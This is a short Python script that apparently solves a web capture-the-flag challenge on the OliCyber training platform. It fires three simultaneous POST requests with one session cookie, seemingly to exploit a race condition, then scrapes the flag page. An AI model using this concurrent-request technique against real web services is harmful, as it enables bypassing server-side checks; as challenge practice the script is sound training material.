import requests
from multiprocessing import Pool
import time
from bs4 import BeautifulSoup

url = "http://invalsi.challs.olicyber.it/"
session_cookie = requests.get(url).cookies['session']

payload = [
    {"random": "balls"},
    {"random": "balls"},
    {"random": "balls"}
]

def give_me_the_flag(i):
    print(f"Richiesta: {i}")
    requests.post(url, json=payload, cookies={"session":session_cookie})

with Pool(3) as pool:
    pool.map(give_me_the_flag, range(3))


r = requests.get(url + "flag", cookies={"session":session_cookie})
soup = BeautifulSoup(r.text, "html.parser")

flag = soup.find("h3")
print("\nFlag: " + flag.text.strip())